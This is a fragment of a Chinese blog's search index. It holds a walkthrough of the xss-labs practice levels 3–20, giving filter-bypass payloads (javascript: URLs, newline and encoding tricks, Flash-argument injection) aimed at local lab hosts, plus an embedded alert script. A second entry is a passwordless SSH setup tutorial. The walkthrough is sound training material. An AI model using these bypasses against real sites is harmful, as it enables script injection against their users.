+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254225731-154.png" alt="在这里插入图片描述"><br>用了 htmlspeialchars()函数 &lt;&gt;”都被过滤<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254227235-157.png" alt="在这里插入图片描述">二者都写可以</p>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和上面一样</p>
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>on 和 script 都被过滤<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254229213-160.png" alt="在这里插入图片描述">这里用 javascript:伪协议<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254230943-163.png" alt="在这里插入图片描述">出来的链接就是答案</p>
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>可以大小写绕过</p>
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>把特殊字符便空了<br>可以双写绕过</p>
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这关卡的死死的<br>要编码绕过<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254233662-166.png"></p>
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>strpos 函数看是否有 http:&#x2F;&#x2F;<br>验证是否为安全连接<br>但是没有限定位置<br>要编码下<br>还要把 http:&#x2F;&#x2F;放最后面用&#x2F;&#x2F;注释掉<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254238979-169.png" alt="在这里插入图片描述"></p>
+<h2 id="level-10-13"><a href="#level-10-13" class="headerlink" title="level 10-13"></a>level 10-13</h2><p>页面没有注入点<br>看源代码发现隐藏的表单<br>要改为文本框 text</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">type=&quot;text&quot; onclick=&quot;alert(<span class="number">1</span>)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>后面几关都要改 t_sort<br>因为后端获取 t_sort 和 user-agent 等<br>要从相应注入点注入<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254242198-172.png" alt="在这里插入图片描述"></p>
+<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><blockquote>
+<p>exif xss 漏洞，exif 是可交换图像文件格式（英语：Exchangeable image file format，官方简称 Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到 exif 的相关属性。</p>
+<p>喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数<br>甚至有些照片能看到经纬度<br>这关要用到<br><a href="http://ww1.exifviewer.org/">exifviewer</a>网页<br>但是<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254247114-178.png" alt="在这里插入图片描述"><br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254245020-175.png" alt="在这里插入图片描述"></p>
+</blockquote>
+<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>对 script、&#x2F;、空格进行了转换<br>空格不可以就用换行符</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span>%<span class="number">0</span>atype=&quot;text&quot;%<span class="number">0</span>a&quot;alert&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-17-18"><a href="#level-17-18" class="headerlink" title="level 17-18"></a>level 17-18</h2><p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254252815-181.png" alt="在这里插入图片描述"><br>火狐不支持 swf 格式<br>把链接加网页上显示出这样<br>很奇怪<br>开始整套娃了<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254256501-184.png" alt="在这里插入图片描述"></p>
+<p>要找个支持 flash 的浏览器才能正常打开<br>17-20 关都能用 flash xss<br><a href="https://www.secpulse.com/archives/44299.html">flash xss 原理</a><br>但这里先用别的办法<br>以 18 关为例<br>注入点可以在 arg02<br>但是你连 swf 都没有哪来的 moouseover 哪<br>所以得 url 连接一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/xss-labs/level18.php/xsf02.swf?a=?arg01=a&amp;arg02=%20onmouseover=javascript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254258261-187.png" alt="在这里插入图片描述"></p>
+<h2 id="level-19-20"><a href="#level-19-20" class="headerlink" title="level 19-20"></a>level 19-20</h2><p><a href="https://www.cnblogs.com/-qing-/p/10853379.html">Flash XSS 漏洞快速上手</a><br><a href="https://www.secpulse.com/archives/44299.html">flash xss 原理</a><br><a href="https://github.com/jindrapetrik/jpexs-decompiler">flash 反编译工具</a><br>以下是大佬的 payload</p>
+<blockquote>
+<p>卑微小杨在线 emo<br>flash 反编译也不懂<br>等有空了再研究吧<br>好多困难等着被克服那<br>这次没支持 flash 的浏览器真没法做</p>
+<p>18 关</p>
+</blockquote>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">http: //<span class="number">10.0</span>.<span class="number">1.83</span>/xsslab/level19.php?arg01=version&amp;arg02=&lt;a href=<span class="string">&quot;javascript:alert(/bmfx/)&quot;</span>&gt;bmfx&lt;/a&gt; ;</span><br></pre></td></tr></table></figure>
+
+<p>19 关</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">http: ; //<span class="number">10.0</span>.<span class="number">1.83</span>/xsslab/level20<span class="selector-class">.php</span>?arg01=id&amp;arg02=bmfx\&quot;))&#125;catch(e)&#123;alert(/bmfx/)&#125;//%<span class="number">26</span>width=<span class="number">998%</span><span class="number">26</span>height=<span class="number">998</span></span><br></pre></td></tr></table></figure>
+
+<script>
+setTimeout(function () {
+    alert('xss');
+}, 1000);
+</script>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
+        <tag>xss-lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>终端便捷ssh（免密）连接</title>
+    <url>/2023/07/%E5%85%8D%E5%AF%86ssh%E7%99%BB%E5%BD%95/</url>
+    <content><![CDATA[<h2 id="普通-ssh-方法"><a href="#普通-ssh-方法" class="headerlink" title="普通 ssh 方法"></a>普通 ssh 方法</h2><p>物理机 ssh 连接虚拟机</p>
+<p>没基础的可以这样连：复杂</p>
+<p><img src= "https://img-blog.csdnimg.cn/322b3e519c8b4a128c24bed4da2c492b.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存失败,源站可能有防盗下来851229742)(C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220610164418979.png)]"></p>
+<p><img src= "/img/a4fbb966a75d4c8cb76f39f6ad5a6247.png" alt="在这里插入图片描述"></p>
+<h2 id="终端快捷-ssh"><a href="#终端快捷-ssh" class="headerlink" title="终端快捷 ssh"></a>终端快捷 ssh</h2><p>复制<code>&#39;s</code>前面的<br>打开终端设置<br><img src= "/img/9fafbf4213e44ca2ac1c80a1262d9750.png" alt="在这里插入图片描述"></p>
+<p>左侧添加新配置文件-&gt;添加新控制文件</p>
+<p>然后填写第二行即命令行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh 虚拟机登录用户名@虚拟机IP</span><br></pre></td></tr></table></figure>
+
+<p>其实就是 ssh 上面复制的</p>
+<p>保存</p>
+<p><img src= "/img/8240fecdcacd49d6b15ccca9c3debe88.png"></p>
+<p>即可在物理机终端快速打开</p>
+<p><img src= "/img/2314c349c1964a2d8ecf9520e7a294dd.png" alt="在这里插入图片描述"></p>
+<h2 id="免密-ssh-登录"><a href="#免密-ssh-登录" class="headerlink" title="免密 ssh 登录"></a>免密 ssh 登录</h2><p>在物理机运行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
+
+<p>后面第一个路径回车</p>
+<p>后面密码直接回车（即可实现免密码登录）</p>
+<p><img src= "/img/754f8f550c2345c6a47fe8bb7c4dee29.png" alt="请添加图片描述"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Your identification has been saved in C:\Users\      /.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in C:\Users\            /.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:ln6ZkrhHWH*********tRbGBeooF4g       \    @</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|      .o.*.+     |</span><br><span class="line">|..   o..+ * .    |</span><br><span class="line">|***********.     |</span><br><span class="line">|   *.o.o+.o      |</span><br><span class="line">|. = +.o*S  .     |</span><br><span class="line">| *********       |</span><br><span class="line">+----[SHA256]-----+</span><br></pre></td></tr></table></figure>
+
+<p>找到第一行的那个目录，把 id_rsa.pub 文件复制到虚拟机</p>
+<p>执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">chmod 770 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>报未找到.ssh 的话</p>
+<p>要先运行<code>ssh-keygen</code>和在物理机设置一样</p>
+</blockquote>
+<p>然后终端打开虚拟机就不用输密码了</p>
+<h2 id="报错情况"><a href="#报错情况" class="headerlink" title="报错情况"></a>报错情况</h2><h3 id="仍需密码："><a href="#仍需密码：" class="headerlink" title="仍需密码："></a>仍需密码：</h3><p>传到虚拟机的 keygen 一定要是公钥 pub</p>
+<h3 id="连接超时"><a href="#连接超时" class="headerlink" title="连接超时"></a>连接超时</h3><p>过一段时间之后 连不上<br>是 ip 未固定<br>需将虚拟机 ip 固定<br>桥接和 net 模式固定 IP 方式会抽空发<br>到时候在这打个传送</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">chmod 700 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>报未找到.ssh 的话</p>
+<p>要先运行<code>ssh-keygen</code>和在物理机设置一样</p>
+</blockquote>
+<p>然后终端打开虚拟机就不用输密码了</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ssh</tag>
       </tags>
   </entry>
 </search>
